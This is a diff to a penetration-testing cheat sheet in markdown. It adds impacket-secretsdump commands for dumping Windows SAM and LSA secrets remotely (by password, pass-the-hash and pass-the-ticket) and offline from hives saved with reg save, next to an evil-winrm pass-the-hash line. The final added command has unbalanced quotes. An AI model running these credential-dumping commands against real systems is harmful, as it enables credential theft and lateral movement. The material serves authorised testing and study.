@@ -251,6 +251,10 @@ Command : smbclient -U <user> \\\\<ip/domain>\\<share>
 
 ## SAM and LSA
 
+### Tools
+
+- impacket-secretsdump
+
 ### Dump SAM and LSA
 ```
 Command : reg save HKLM\SAM "C:\Windows\Temp\sam.save"
@@ -258,11 +262,32 @@ Command : reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
 Command : reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
 ```
 
-#### Dump AD password hashes
-```
-Command : python3 secretsdump.py -just-dc-ntlm <domain>/<user>@<ip/domain>
-```
+#### Dump SAM and LSA w/ impacket-secretsdump
 
+Remote dumping of SAM & LSA secrets
+```
+Command : impacket-secretsdump "<domain>/<user>:<password>@<ip/domain>"
+```
+Remote dumping of SAM & LSA secrets (pass-the-hash)
+```
+Command : impacket-secretsdump -hashes "LMhash:NThash" "<domain>/<user>@<ip/domain>"
+```
+Remote dumping of SAM & LSA secrets (pass-the-ticket)
+```
+Command : impacket-secretsdump -k "<domain>/<user>@<ip/domain>"
+```
+Offline dumping of LSA secrets from exported hives
+```
+Command : impacket-secretsdump -security "<path to security.save>" -system "<path to system.save>" LOCAL
+```
+Offline dumping of SAM secrets from exported hives
+```
+Command : impacket-secretsdump -sam "<path to sam.save>" -system "<path to system.save>" LOCAL
+```
+Offline dumping of SAM & LSA secrets from exported hives
+```
+Command : impacket-secretsdump -sam "<path to sam.save>" -security "<path to security.save> -system "<path to system.save> LOCAL
+```
 #### Pass the hash
 ```
 Command: evil-winrm -i <ip> -u <user> -H <ntlm hash>
